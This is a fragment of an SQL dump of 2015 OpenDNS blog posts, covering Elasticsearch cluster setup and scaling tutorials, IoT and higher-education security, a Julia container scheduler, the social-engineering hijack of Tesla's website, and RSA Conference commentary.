security advances, these benefits may be the first of many more to come. If the explosive growth of security as a service companies are any indication of trust, companies are more than willing to place their bets on cloud services–augmenting or even abandoning their hybrid and on-premises solutions.\nDiscussing Google’s adoption of cloud security, Jon Oltsik, senior principal analyst at IT research firm Enterprise Strategy Group, said, “A lot of companies can learn from Google’s aggressiveness…There’s not a company anywhere that won’t have to develop something like this.”', 'Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2015/05/12/cloud-delivered-security-think-outside-the-box/');

In order to move forwards with Elasticsearch it also needs to be easily scalable while maintaining high availability. This post will first explore three different node roles and how to use them scale an Elasticsearch cluster while maintaining a balanced workload. Moving forwards, this post will talk about a few different failure cases and how to protect a cluster from them.\n\nScalability\nScaling horizontally with Elasticsearch is as straightforward as it gets. Adding more nodes to an Elasticsearch cluster is as simple as firing up a new Elasticsearch instance with the cluster name in the Elasticsearch config(elasticsearch.yml) file to match the rest of the cluster. When the new node comes online it will be automatically discovered by the cluster and get to work right away. As a cluster grows, three different types of nodes can to be added. Part of maintaining a stable cluster is making sure that there are the right number of nodes performing each role.\nData Nodes\nData nodes are the workhorses of the cluster. They are responsible for indexing documents and performing searches as well as other index operations. Adding data nodes is the best way to scale up an Elasticsearch cluster if indexing and/or search performance needs to be improved.\nA data node has the following configurations:\nnode.master: false\nnode.data: true\nAdding these setting ensures data nodes will focus solely on their jobs of searching and indexing without running the risk of taking on the responsibilities of a master node.\nMaster Node\nAs an Elasticsearch cluster gets larger the cluster state becomes more cumbersome to maintain. This means your master node will be doing more work as you scale so it becomes more important to have a dedicated master node with at least one backup master node in the case of a failure. For large clusters it is recommended to have a total of three dedicated master nodes, of which one will be the master and two will be backups.\nA dedicated master node is a node with the following configurations:\nnode.master: true\nnode.data: false\nThese settings prevent the node from storing data thus enabling it to focus solely on its job as a master node.\nLoad Balancer Node\nAdditionally, if an Elasticsearch cluster is receiving a high volume of index or search requests, adding some load balancing nodes can take some of the stress off the data nodes in the cluster. A load balancer node is not a master node and it also does not store any data. Its sole responsibility is to handle all HTTP communication.\nA load balance node has the following configurations:\nnode.master: false\nnode.data: false\nLoad balancer nodes take pressure off of data nodes by routing search and index requests to the relevant nodes. This prevent requests from being bounced between data and/or master nodes. Additionally load balancer nodes perform all of the “Scatter and Gather” operations of a search request, allowing data nodes to focus on their primary functions.\n\nMaintaining a Balanced Cluster\nAs a cluster grows, the number of shards will need to grow with it to ensure the workload is properly balanced among the cluster. If the number of data nodes grows beyond the number of shards, then some nodes will not be used. Alternatively, if the number of nodes is not a multiple of the number of shards, then the cluster will not be evenly balanced. One way to balance a cluster is by attempting to maintain a static number of shards per node. This setting is configured and can be updated in the index template. For example, to maintain a cluster with two shards per node, the following template could be used:\ncurl -XPUT localhost:9200/_template/template_1 -d \'\r\n{\r\n    \"template\" : \"syslog-*\",\r\n    \"settings\" : {\r\n        \"number_of_shards\" : <Number of data nodes>\r\n       \"number_of_replicas\": 1\r\n    },\r\n    \"mappings\" : {\r\n        \"log\" : {\r\n            \"properties\" : {\r\n                  \"Timestamp\" : {\"type\" : \"date\",\r\n                               \"fielddata\": {\r\n                                    \"loading\" : \"eager\"\r\n                                    }\r\n                             },\r\n                  \"URL\" : {\"type\" : \"string\",\r\n                             \"index\": \"not_analyzed\"},\r\n                  \"IP Address\" : {\"type\": \"ip\"}\r\n            }\r\n        }\r\n    }\r\n}\r\n\'\nSending this request will simply update the template with the new number of shards, but will only be applied to new indices. Once an index is created, the number of primary shards cannot be changed. We can however, balance older indices by increasing the number of replicas per shard using the following request:\ncurl -XPUT \'localhost:9200/dns-test-1/_settings\' -d \'\r\n{\r\n     \"index\" : {\r\n     \"number_of_replicas\" : 1\r\n     }\r\n}\'\nFor example the graphic below shows a two-data node cluster with a balanced index:\n\nWith two primary shards per index, each with one replica, the workload will be evenly balanced between the data nodes. Then, adding a new node, the shards will be rebalanced automatically:\n\nWith three data nodes but only two primary shards per index, the workload is no longer evenly balanced. “Blind Faith” could receive double the traffic of “Jocasta” or “Stanley Stewart”. Now update the template, setting “number_of_shards” to three, up from two, so new indices will be balanced evenly:\n\nFinally, increase the number of replicas of the old index to rebalance it:\n\nThis last step may not always be necessary as it will significantly increase the storage requirement of the index, especially if rebalancing the index requires adding more than one additional replica.\n\nAvailability\nWith three different types of nodes, maintaining high availability means handling three different failure cases.\nData Node Failure\n\nThe most common case is the failure of a data node. In the case of a data node failure, Elasticsearch will automatically rebalance each index by creating a new copy of each failed shard using its replicas. In the time between when a node fails and the failed shards are replicated, the cluster will enter the “yellow” cluster state. This means data loss is possible if another node fails during this window. Furthermore, no node can store more than one replica of the same shard, so it is possible extra replicas will not be reassigned after a failure. They will simply wait until the failed node comes back online. For example:\n\nNode “Flash Thompson” Fails:\n\nCluster Health is now “Yellow” due to shards ‘0’ and ‘2’ in “dns-test-2” being replicated. Once they are finished, there will be unassigned shards in “dns-test-1” still but every shard will have a stable replica:\n\nCluster Health is still “Yellow” due to unassigned shards in “dns-test-1,” but the cluster is stable as every shard has at least 1 replica. Now bring the node back online and the cluster will return to normal:\n\nMaster Node Failure\nAnother case is the failure of a master node. In this case, having a backup master node is essential since otherwise a data node will be elected as the master. A data node might not be able to handle the added responsibility of maintaining the cluster state which could result in all kinds of badness. Otherwise, if a master node fails a backup will simply be elected master and the cluster state should be maintained. For example:\n\n“Margo Damian” is currently the master node, but “Warstar” is ready and waiting in case of a failure. Then if the master node does fail:\n\n“Warstar” is automatically elected as master and the cluster state is maintained.\nFurthermore, it is important to maintain the right number of minimum master nodes in Elasticsearch to prevent the “Brain Split” problem where two master nodes are elected within the same cluster. To do this, maintain the discovery.zen.minimum_master_nodes setting at a quorum of eligible master nodes in the cluster. For example, for a cluster with three eligible master nodes, the minimum master nodes should be set to two in Elasticsearch’s configuration.\ndiscovery.zen.minimum_master_nodes: 2\nRead more about the Brain Split problem here.\nLoad Balancer Node Failure\nUnfortunately, failure of a load balancer node cannot be automatically dealt with by Elasticsearch. Any requests sent to the failed node will return an error message that must be handled on the client side.\nIf any node that is receiving index or search requests fails, the following exception will be thrown:\norg.elasticsearch.client.transport.NoNodeAvailableException: None of the configured nodes are available: []\nHaving multiple load balancer nodes should allow the client to handle this exception and redirect the request to an available node.\n\nConclusion\nIn this second part of our series, Elasticsearch has shown that it can be scaled and balanced with relative ease. Additionally, Elasticsearch can maintain a highly available cluster by assigning specific roles to each nodes and having available backups. In the next post in our series on Elasticsearch we will look into optimizing searching and sorting for log data.\nContinue to: Elasticsearch: You Know, For Logs [Part 3].', 'Security Engineering;Uncategorized', 'https://umbrella.cisco.com/blog/2015/05/07/elasticsearch-you-know-for-logs-part-2/');

It’s a bricolage of technologies and devices that now operate on the Internet we all currently use.\nRegardless of specific devices, three characteristics typically comprise IoT devices:\nConnectivity–whether it is inherent to the device, or an add-on feature via WiFi, 4G, NFC, Bluetooth, ZigBee, etc.\nSomething it can measure or track or communicate\nAn ability to control or access the thing–or its data–remotely.\nNot all devices possess all three, and many devices can do a lot more. But if it uses power, physically moves, takes input, or has a potential to communicate any useful information, it can be an IoT device.\nTake an ordinarily inanimate object, like a shoe–for example. Add some sensors and an app to read what it captures, and suddenly it becomes an object with a compelling story. Same old shoe, but now it can answer loads of important questions. How many steps per day does this shoe take? How much pressure from heel to foot does the shoe experience? What is the current treadwear? What flavor gum was that on the sidewalk?\nIoT and Security\nThough the phrase has been deemed as overhyped, IoT’s established and growing presence in the enterprise network space demands attention, because the devices that comprise IoT typically have not been included in company security policies.\nBillions of newly connected devices mean as many new endpoints security professionals have to monitor, and a whole genus of new devices for IT  detect and manage.\nDuring the International Conference on Cyber Engagement at Georgetown, In-Q-Tel CISO Dan Geer, put the scale of protecting IoT into perspective. “If perimeter control is to remain the paradigm of cybersecurity, then the number of perimeters to defend in the Internet of Things is doubling every 17 months,” he said.\nPrepare by defining what IoT means to your org and its people.

The tool combines historical data about container resource consumption with a mathematical model to best decide which host should run each container. This formulation is a type of bin packing problem, and I used the JuliaOpt project’s JuMP package to formulate the solution in the Julia programming language.\n\nProblem Statement\nGiven pools consisting of a quantity of identical Docker containers, each with known historical memory, CPU, and network I/O usage, and given a finite number of hosts each with known memory, CPU, and network I/O capacity – assign each container in a pool to a single host. The sum of memory and network I/O of the containers on the host must be less than its capacity. Because it is the main resource constraint for hosts, minimize the expected CPU usage on each host. In addition, attempt to keep different containers from the same pool on different hosts to create redundancy.\n\nData\nCollecting historical data about the resource usage of each container proved to be the most time-consuming portion of the process. The Quadra system logs resource consumption for each container in InfluxDB. So, my hackathon project starts by using this API to get a list of currently-running containers and their resource consumption over the last hour. Data about running Docker containers is accessible through the Docker Stats API introduced in v1.5.0 or by using cAdvisor.\nResource consumption by containers tends to be highly variable. For some pools, such as web apps, traffic changes proportional to web visitors throughout a day. For pools used by headless browser tests, resource consumption is often low with periodic bursts in CPU. Staging environments use comparatively little resources.\nDuring the formulation, I assume that the host overhead is negligible for everything but the resource consumption.\n\nCalculation\nThe hackathon container scheduling system was written using the Julia programming language. I formulated the problem using the JuMP package from JuliaOpt. JuMP provides a metalanguage for expressing optimization problems, then passes off the actual calculation to configurable solvers. I used the open-source CBC solver from the COIN-OR project.\n\nAfter running the calculation, the script makes API calls to move containers between hosts.\n\nSpeed\nThis problem’s complexity is NP-Hard, so the actual calculation times with the branch and bound algorithm became infeasible for real-world use when I tested more than 200 pools of containers. Solving a small data set of 20 pools across 4 hosts took seconds, but 200 pools across 10 hosts never converged after 8 hours on my Macbook. Fortunately the algorithm is parallelizable, so it is possible to utilize all resources on a multi-core device.\nThe calculation takes so long because it seeks a convergent, optimal solution. However, the practical application of this system means that slight variations away from the optimal solution are viable. This is due to uncertainty in the data used for the calculation and the excess capacity on each host. A way to deal with this summarized in the “Formulation” section bullet point below.\n\nPossible Improvements\nData – When pulling historical data – instead of using an average, use the (average + standard deviation) or (average + 2*standard deviation) in order to account for fluctuations in container resource consumption.\nFormulation – Instead of treating the problem as an optimization with an objective function – treat it as a constraint programming problem. To do this in the script – set a static CPU limit, modify the constraint to be less than this variable, and delete the objective function.\n\nApplications\nThe system is designed to run on a cron job – perhaps every hour – in order to continuously reallocate containers between hosts as their resources change and new pools get added.\nThe most practical application of this system that I found was capacity planning. With slight modification, it is possible to use this script to determine the minimum number of hosts required to service all containers. Decreasing hosts, even by one, has the potential for significant cost recovery.\nDisaster recovery is another application. If a host goes down and a new one needs to be provisioned to take its place, this system can reallocate all containers before the new host is available, then again reallocate when the new host is available.\n\nNext Steps\nThe current scheduler is a proof of concept. Its most important use may be capacity planning for selecting the quantity and resources of hosts used for Quadra.

They are the crucibles in which our most brilliant minds are forged, serving as exchange points to discuss and collaborate on the new theories and inventions that shape our world. However, these great advantages also come with unique security challenges to overcome.\nThe higher education vertical has been often lumped together with the enterprise in security discourse—and to be fair, the two have many similarities, such as the need for multiple enforcement policies, large numbers of end users, and distributed networks, to name a few. However, the differences between the two are enough that universities and colleges need their own security discussion, one that examines the needs and challenges specific to higher education. And this discussion cannot happen soon enough. Since 2005, there have been more than 500 breaches at higher education institutions. In 2014 alone, these breaches accounted for 35% of all reported attacks.\nTo find out more about the unique challenges facing higher education, I sat down with OpenDNS Network Security Engineer Alvin Wong, who has held several IT and security positions at both the University of British Columbia and BCNet.\nIn Wong’s opinion, approaching security at an educational institution like a commercial enterprise may not be a good fit. “Academia requires free and open Internet access without filtering or censorship,” he said. “So to put in traditionally enterprise-focused security controls can be difficult and quite political, in the literal sense of the word.”\nAcademia Demands Open Networks\nThe disparity between being a secure institution, and being free and open is further complicated by the distributed nature of many university networks, which can stretch across cities and even around the globe. Although Wong mentioned several potential issues this system introduced, one of the most common was student and faculty connectivity. A professor in Tokyo must have the same protection as a professor in New York, as they’re accessing the same internal resources and data—not to mention partnerships with other schools and potentially corporations.\nAnother complication is the democratic process institutions use to decide issues like security and access. This dramatically increases the amount of time it takes for adequate security policies to take effect, an unfortunate situation in an industry where even seconds could make a substantial difference during an attack. “Everyone has to have a seat at the table,” Wong said. “It’s not the same as a corporate environment where you can have a strict security policy—a ‘straight block anything, ask questions later’ type of situation.”\nRamen Dinners, Library Naps, and BYOD\nIn a recent Forbes blog, Sue Poremba called campuses a “melting pot of devices, applications, social media groups, and technology fads.” Mobile devices have worked their way firmly into our everyday lives, and you’d be hard-pressed to find any college student without a laptop, smart phone, or tablet handy at all times.\nThis creates a host of issues for busy campus security practitioners, who must secure an ever-increasing number of devices. “Schools have a huge BYOD problem,” Wong said. “There’s no such thing as a perimeter for a university.”\nStudents aren’t the only ones bringing devices to the network either—especially in research universities. “When researchers get funded, they usually bring in their own equipment. The main focus is then getting that equipment hooked up to the network properly, instead of dictating policy,” Wong said. “Unfortunately, security isn’t always top of mind for researchers.” This is especially troubling as research is one of the most targeted elements inside campus networks, after personal data.\nRodney Petersen, managing director for the Washington office of EduCAUSE, says institutions have failed to acknowledge the need for better protection. “What we have been slow to recognize is that the information we have on campus–whether it’s the intellectual property of the academy, or more importantly personally identifiable information–requires a similar level of high protection,” he said.\nShadow IT Is Rampant in Campus Networks\nIn addition to the challenges presented by BYOD, and also in part because of them, shadow IT is another prevalent issue at universities. Wong indicated that due to the proliferation of cloud services, and a lack of visibility into network activity, administrators are essentially running blind.\n“What’s to stop Professor X from putting some intellectual property on Dropbox or some other service, or sending an email from a non-university email? There’s all kinds of complexity surrounding where data is stored and people using things beyond the perimeter,” Wong said.\nWith app stores just a click away, and a campus full of insecure BYOD devices, shadow IT presents a juicy opportunity for attackers. “Our endpoints were a point of entry into our infrastructure,” Wong said. “We saw a lot of viruses, a lot of malware getting on machines—just detecting those and having visibility into the network was a challenge.”\nUser education is a way around this problem though, Wong stated. “Making sure everyone is on the same page when it comes to software, for example, what AV to use, and making these tools easily available, is essential,” he said. “Then, you can have staff reinforce the policy, like making sure students have up-to-date software versions installed.”\nPhishing and Infrastructure Attacks\nAccording to Wong, public universities are required to provide contact information online, providing a veritable feast of information for social engineers to use as credentials. With endpoints left vulnerable, spear phishing against a member of the school teaching staff or administration could prove devastatingly effective.\nIn addition to phishing, schools also have to be wary of parasitic infrastructure attacks, Wong said. “Universities are pretty valuable for computing power, and for bandwidth to store traffic or use for DDoS attacks—attackers aren’t just after the intellectual property, but are attempting to gain control of infrastructure they can leverage.”\nThese are a small sampling of the challenges faced by higher education institutions. As attacks grow bolder and technology advances, it becomes more vital than ever to have a scalable, robust security stack in place, as well as a healthy user education program to mitigate infections caused by user error. “A lot of higher ed security is reactive, simply because of the sheer scale and number of projects, and the disparate directions people are going,” Wong said. “It’s definitely harder than enterprise security, if we’re comparing the two.”', 'Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2015/05/06/security-challenges-mount-for-higher-education/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1364, 'Elasticsearch: You Know, For Logs', 'OpenDNS Engineering', 'May 5, 2015', 'The data platform team at OpenDNS is always looking at new technologies to improve our real time search platform. Consequently, we have been keeping a close eye on Elasticsearch for quite a while, and even use it for some internal tools and metrics. OpenDNS is now looking at using Elasticsearch as a real time search engine for our DNS log data. OpenDNS needs a powerful real time logging and search platform for several reasons. First and foremost is for our customers. Our customers need to be able to identify malicious activity on their networks as it is happening so they can respond promptly. Any time spent waiting for the data to come in is time that infections could be spreading or attacks could be gaining momentum. Similarly, we at OpenDNS use this data to monitor our own systems using several different metrics. If something goes wrong, we need to know right away so we can fix the problem before it propagates. Overall, getting data in real time means that the people monitoring this data can react in real time. This reaction time could mean the difference between a minor headache and a catastrophic problem.\nFor Elasticsearch to solve this problem, it not only has to be real-time, but scalable and manageable as well. OpenDNS is growing quickly, so we need a system that can grow with us without introducing technical debt. Also, our engineers don’t like getting paged on Sunday at 3 a.m., so we need a system that can deal with failures automatically without missing a beat.\nPart 1: Introduction and Setup\nThis blog post is the first in a series that will will focus on Elasticsearch and how to optimize it for log data. For information on other Elasticsearch products, including their recommended real time logging stack “ELK,” vist https://www.elastic.co/products.\nFurthermore, this series will mainly show examples using Elasticsearch’s REST API, because it is simple and easy to use. With that said, Elasticsearch supports several client languages, listed here.\nWhat is Elasticsearch?\nElasticsearch is a highly scalable search platform based on Apache Lucene. It is built from the ground up for the cloud and supports distributed indices and multitenancy. Since its release in 2010, Elasticsearch has gained many notable users and remains a very active project at Elastic under its creator Shay Banon.\nGetting started with Elasticsearch\nThe Elasticsearch website has great documentation to walk users through installation. Everything needed to get started is here.\nElasticsearch was designed to be distributed, so to demonstrate its full functionality it is important to set up a cluster of at least three nodes. Creating a three node cluster should be as simple as running three Elasticsearch instances with the same cluster name. The “cluster.name” variable is found in the main Elasticsearch configuration file “elasticsearch.yml” in the “config” folder. By default a three-node cluster will include two data nodes along with one elected master node.\nOnce Elasticsearch is installed and the cluster is connected, users need a way of visualizing their cluster. Elasticsearch supports a plugin called “Head” that will to exactly this, plus a little extra.\nTo install Head simply run this command from the ‘elasticsearch’ folder:\nbin/plugin --install mobz/elasticsearch-head\nOnce installed, it can be accessed through\nhttp://<hostname>:9200/_plugin/head/\nHead gives an intuitive view of the indices and shards of an Elasticsearch cluster as well as the ability to easily browse and search through its documents. When head is first opened, it should look something like the following:\n\n\n\nThis image shows a simple Elasticsearch cluster with three nodes: two data nodes indicated by the black circles and one master, indicated by the black star. On the right is an index named “dns-test-1.” Each green box represents a “Shard,” which are Lucene Inverted Indices under the hood. By default an Elasticsearch index has five shards, each with one replica. Primary shards are shown with emboldened borders and replicas are shown with light borders.\nElasticsearch is designed to work straight out of the box, no need to worry about schemas or creating indices yet. As long as each document is given a type and an index name, it will index the document.\nExample:\ncurl -XPOST \'http://localhost:9200/logs/log\' -d \'{\r\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\r\n    \"URL\" : \"opendns.com\",\r\n    \"IP Address\" : \"127.0.0.1\",\n\"log_id\" : 1\r\n}\'\nSending a simple index request will automatically create an index called “logs” and index the given document. Elasticsearch will also automatically guess the type of each field and index the doc. Elasticsearch is pretty smart. If formatted properly the “Timestamp” field will default to the “date” data type and the “log_id” field will default to type “int.” Though trickier fields such as “IP Address”  will default to just a string, even though Elasticsearch does have a native “IP” data type. The documents themselves are indexed and stored in JSON format.\nNote that once the data type for a field is set, it cannot be changed. For example if the following document:\ncurl -XPOST \'http://localhost:9200/logs/log\' -d \'{\r\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\r\n    \"URL\" : \"opendns.com/enterprise-security\",\r\n    \"IP Address\" : \"127.0.0.1\",\r\n    \"log_id\" : \"abcd\"\r\n}\'\nis indexed after the previous one, the following exception is thrown:\nRemoteTransportException[[Reptyl][inet[/10.70.99.146:9301]][indices:data/write/index]]; nested: MapperParsingException[failed to parse [log_id]]; nested: NumberFormatException[For input string: \"abcd\"];\nMappings\nAfter an initial cluster is set up, an important step is to create a type mapping for the documents being indexed. The data type and other settings of each field for a specific document type are all stored in a type mapping which is configured using the Elasticsearch Put Mapping APl. Although a default mapping will be created by Elasticsearch when a new document is indexed, the default data types are often too general. For example, any field containing only an integer will be defaulted to type “long.” In this case, manually setting it to type “integer” might better represent the data and simultaneously save some storage space. Also, any “string” fields need to be set to “not analyzed.” By default Elasticsearch will tokenize all string fields with an analyzer. This functionality is mainly implemented to support full text search and document scoring. For log data in general, queries are match only, so none of this is important. Setting the “index” field to “not_analyzed” ensures Elasticsearch won’t waste time unnecessarily tokenizing every string field.\nBefore creating a mapping, any default mapping created by Elasticsearch should be deleted in order to avoid conflicts. This will also delete any documents that have been indexed into this default mapping, so be careful. Mappings are deleted with the following command:\ncurl -XDELETE \'http://localhost:9200/logs/log/_mapping\'\nHere is an example of a put mapping command that specifies a simple mapping  for documents with type “log” belonging to the index “logs” with three fields and their datatypes:\n$ curl -XPUT \'http://localhost:9200/logs/_mapping/log\' -d \'\r\n{\r\n    \"log\" : {\r\n        \"properties\" : {\r\n           \"Timestamp\" : {\"type\" : \"date\"},\r\n           \"URL\" : {\"type\" : \"string\",\r\n                      \"index\": \"not_analyzed\"},\r\n           \"IP Address\" : {\"type\": \"ip\"},\r\n           \"log_id\" : {\"type\" : \"integer\"}\r\n        }\r\n    }\r\n}\'\nOnce a mapping is set, it is important to note that indexing documents matching the mapping type, but with fields not included in the mapping will add said fields to the mapping.\nFor example, if, after applying the previous mapping, I tried to submit the following index request:\ncurl -XPOST \'http://localhost:9200/logs/log\' -d \'{\r\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\r\n    \"URL\" : \"opendns.com/enterprise-security\",\r\n    \"IP Address\" : \"127.0.0.1\"\r\n   \"log_id\" : \"2\",\r\n   \"user\" : \"John\"\r\n}\'\nThe “user” field with type “string” would be added to the mapping automatically.\nDocument IDs\nIf unspecified, Elasticsearch will simply generate an ID for each document. This works fine in some cases, but often the user needs to be able to add their own ids.\nIn the most simple case, a document ID can be added to an index request itself as in the following:\ncurl -XPUT \'http://localhost:9200/logs/log/37\' -d \'{\r\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\r\n    \"URL\" : \"opendns.com/enterprise-security\",\r\n    \"IP Address\" : \"127.0.0.1\"\r\n}\'\nSimply change the request to “XPUT” and tack on the ID to the end of the URL.\nAlternatively, a field can be added to the mapping along with a specified path to pull the ID from the document itself.\nThe following mapping will tell Elasticsearch to use the “log_id” field as the document ID:\n$ curl -XPUT \'http://localhost:9200/logs/_mapping/log\' -d \'\r\n{\r\n   \"log\" : {\r\n         \"_id\" : {\"path\" : \"log_id\"},\r\n         \"properties\" : {\r\n               \"Timestamp\" : {\"type\" : \"date\"},\r\n               \"URL\" : {\"type\" : \"string\",\r\n                           \"index\": \"not_analyzed\"},\r\n               \"IP Address\" : {\"type\": \"ip\"},\r\n               \"log_id\" : {\"type\" : \"integer\"}\r\n       }\r\n    }\r\n}\'\nIndex Schema and Templates\nWith a large amount of data coming in every day, it is important to have a comprehensive way of partitioning the data into Elasticsearch. For log data, it is often intuitive to partition the data into indices based on a time interval such as daily or hourly. Partitioning data in this way comes with several advantages. For one, data expiration becomes very easy. Instead of relying on a TTL or other expiration methods, old indices can simply be deleted altogether. Another advantage comes when the data is queried. If a query is only looking for documents from a certain time period, it can be limited to fewer indices instead of having to query an entire cluster. This index schema is especially advantageous in the real time search use case. Since the most recent index will likely be receiving the majority of the traffic, Elasticsearch will maintain a larger cache for this index, improving performance. (More about caching coming in future posts.)\nThis process of creating indices, along with settings and mappings, can be automated in Elasticsearch by using an “Index Template.” The job of an index template is to automatically apply mappings and other settings to an index at the time it is created. A basic index template will contain: a mapping for each type to be indexed, the name or wildcard expression matching the indices to which the template should be applied, and the number of shards and replicas each index should contain. All you have to do is index a document with an index name that matches one of your templates and the index will be automatically created using the template (assuming the index doesn’t already exist).\nFor example, if indexing DNS logs by the day the index naming schema might look something like “dnslog-YYYY-MM-DD,” with each subsequent index name incremented by one day. It would be too much work to apply settings and mapping to each index individually. Templates can be applied to every index matching this schema by creating a template first with a wildcard in the “template” field.\nFor example an index template that would be applied to every “dnslog-YYYY-MM-DD” index would look something like:\ncurl -XPUT localhost:9200/_template/dns_template -d \'\r\n{\r\n    \"template\" : \"dnslog-*\",\r\n    \"settings\" : {\r\n        \"number_of_shards\" : 3,\r\n       \"number_of_replicas\": 1\r\n    },\r\n    \"mappings\" : {\r\n        \"log\" : {\r\n            \"properties\" : {\r\n               \"Timestamp\" : {\"type\" : \"date\"},\r\n               \"URL\" : {\"type\" : \"string\",\r\n                           \"index\": \"not_analyzed\"},\r\n               \"IP Address\" : {\"type\": \"ip\"}\r\n            }\r\n        }\r\n    }\r\n}\r\n\'\nOnce this template has been applied, creating a new index with mapping and settings already applied is as simple as sending an index request.\nExample:\ncurl -XPOST \'http://localhost:9200/dnslog-2015-04-09/log\' -d \'{\r\n    \"Timestamp\" : \"2015-04-09T14:12:12\",\r\n    \"URL\" : \"opendns.com/enterprise-security\",\r\n    \"IP Address\" : \"127.0.0.1\"\r\n}\'\nAfter applying the previous template the command above will create the index “dnslog-2015-04-09” containing three shards with one replica and the “log” mapping already applied.\nConclusion\nIn this first post of our series, Elasticsearch has shown that it is flexible enough to be set up for log data using properly configured Index Templates and Type Mappings. In the next post in our series, we will explore the scalability and availability of Elasticsearch.\nFor more information on Elasticsearch, check out their website at http://www.elastic.co.\nContinue to: Elasticsearch: You Know, For Logs [Part 2].', 'Security Engineering;Uncategorized', 'https://umbrella.cisco.com/blog/2015/05/05/elasticsearch-you-know-for-logs/');

The Tesla Motors website was not “hacked.” Nor was it sophisticated. What happened was the Internet equivalent of storefront graffiti. Trolling attackers, suspected to be associated with LizardSquad, hijacked Tesla’s website and the official Twitter accounts of Tesla Motors and CEO Elon Musk. They did all this simply through phone calls to a couple vendors and password reset requests, according to Tesla’s statement.\nThe hijack was not significantly damaging, and Tesla responded quickly. It was corrected within hours, and–malicious as they were–the attackers were more bent on snark and self-promotion than outright destruction. In other words, it could have been much worse.\nUnfortunately for Musk and Tesla, the attack could have been easily prevented. This particular attack was the result of “social hacking,” which is just a way of saying attackers got AT&T and Network Solutions–both vendors who have previously been called out for large-scale security mistakes–to do something unwarranted. Had AT&T followed proper protocol and verified the identity of whomever called initially to request forwarding for all incoming calls to an unknown number, the attack likely would have stopped there. Likewise, if Tesla had two-factor authentication enabled on corporate e-mail and on its domain controls, the attack would likely have stopped at the verification stage.\nThe measures that could have prevented this attack are all security 101. It’s a tough lesson for Tesla, but a good reminder for us all.\nForget the FUD and Cover the Basics\nVerizon’s 2015 vulnerability report, arguably the authoritative assessment on the state of security, is rife with examples of how the security basics are leaving gaps wide open for attackers to exploit. Simple efforts are being left out of security plans for many companies, things like software patches, change alerts, two-factor verification, and so on.\nQuentyn Taylor, head of security for Canon EMEA, reminded a crowd at 44Con that the emergence of new, scary attacks doesn’t mean companies should lose focus on the fundamentals. According to Talyor, it’s a good practice for executives and security practitioners to step back, and ask themselves what they truly understand, and if they have covered the basics.\n“It’s fashionable to focus on the black swan events like cyber-espionage, but we ignore the fact that patching is generally done very, very poorly,” Taylor said. “The basics are absolutely being forgotten, and there is a mentality to focus on new things.”\nSpend Ample Time Vetting Service Vendors\nBefore getting on board with a vendor and trusting it to provide quality service and security, it’s important to spend time digging into the company’s history, security precautions, and review their access regularly. According to OpenDNS Director of Security Tom Hash, this is the best way to keep out of an expensive breach. “It’s one thing to sign an NDA,” he said. “But it doesn’t give you any legal recourse if the company fails or gets compromised.”\nExhaustive security vetting aside, even a cursory news search by Tesla might have prevented the automaker from choosing Network Solutions in the first place, given the prior breaches and domain slamming accusations in its track record.\nMarco Davids, a technical advisor with the Netherlands domain authority SIDN, says not all registrars are created equal, and companies often don’t know the difference. “There is a quality difference between registrars and DNS operators,” Davids said. “Some are better than others. But many registering [companies] don’t take the time to even compare them. They often just pick one.”\nAsk Service Providers What Security Precautions Are Available\nTesla’s statement gave a succinct breakdown of how the attack occurred, first by getting AT&T to forward all calls. “Using the forwarded number, the imposter added a bogus email address to the Tesla domain admin account,” a spokesperson told Forbes. “The impostor then reset the password of the domain admin account, [and] routed most of the website traffic to a spoof website.”\nChanges like these should not be allowed to happen, certainly not without at least an alert from the vendor. Davids says change discovery is also crucial when monitoring a company’s domain information. “Good monitoring is essential [at the registry level],” he said. “If an incident occurs, good monitoring will help discover anomalies instantly.”\nFor authoritative reference, ICANN provided a list of specific measures to protect domain name registrations back in 2010. The SAC 044 document specifically covers how to protect against unauthorized account access and chages:\nUse different credentials for each account\nSecurely escrow all registration account details\nDefine and implement a recovery process\nAnd use configuration change notifications to trigger checks by technical staff to verify changes are authorized and correct.\nTwo-Factor Everything. Every. Thing.\nSpeaking to TechWire FBI special agent Wes Drone made his advice unequivocal. “The single most important thing you can do as an individual is to protect your email account,” he said. “I’ll say it again: The single most important thing you can do is to protect your email account.”\nAnd the best way to do that? A strong password with two-factor authentication. Multifactor authentication combines something you know–like a password–with something you have, hopefully a security token or even a mobile device to receive a temp code or text message verification. Even an e-mail verification is better than nothing.\nBut by all means, don’t stop at two-factor for e-mail. Had Tesla gone through two-factor efforts on its registry system, e-mail, and Twitter accounts, this incident would not have happened. It should be applied to anything that uses a password if possible.\nFor help finding out which vendors and social media companies have two-factor in place, consult the 2FA List.', 'Blog;News', 'https://umbrella.cisco.com/blog/2015/04/30/how-security-basics-tripped-up-tesla/');

This year, both established industry personalities and executives at cutting-edge security startups remarked that the infosec industry seemed to have accepted that many outdated yet fundamental security assumptions need to be re-examined. One notable example was the show’s official press conference, where new RSA President Amit Yoran said the incumbent security model of the information security industry was fundamentally broken, and highlighted the need for improved threat intelligence to identify attacks that are in progress.\n\nAt the annual OpenDNS Researcher and Responder Party, held last Wednesday at OpenDNS’s headquarters in San Francisco’s SOMA neighborhood, several companies who are exploring new ways to deliver enterprise security were on-hand. Several of them discussed how both the industry in general and the RSA Conference in particular have changed in recent years.\nChris Cullison, CTO and Co-Founder of ZeroFOX, a threat intelligence company that focuses on social media, said the increased attention at this year’s show on detecting attacks before they strike has been good for awareness of his company’s business.\n“Previously, a lof of people were trying to build their own threat intelligence products, not realizing that someone was already trying to solve this problem,” Cullison said. “Telling our story two years ago was a little bit harder.”\nCullison was one of several security startup executives in attendance to demo their products and services for incident responders. The Researcher and Responder Party focuses on providing an environment where researchers and technical professions can network and learn about new tools for predicting, investigating, and responding to security incidents.\nOther attendees agreed with Cullison’s assessment. “Walking around the RSA expo floor I saw a lot of newer companies both in the endpoint and threat intelligence space,” said Stephan Chenette, Co-Founder and CTO of Attack IQ.\nAnother thing that was impossible to ignore this year was the event’s size. This year broke all previous records for attendance, with conference organizers reporting 33,000 attendees, an increase of over 4,500 attendees from last year.\n“I’ve been going to RSA for more than 10 years,” Chenette said. “I’ve seen more companies and attendees this year than in any other year that I attended.”\nThreatConnect Senior Threat Analyst Jody Caldwell agreed, calling the crowds on 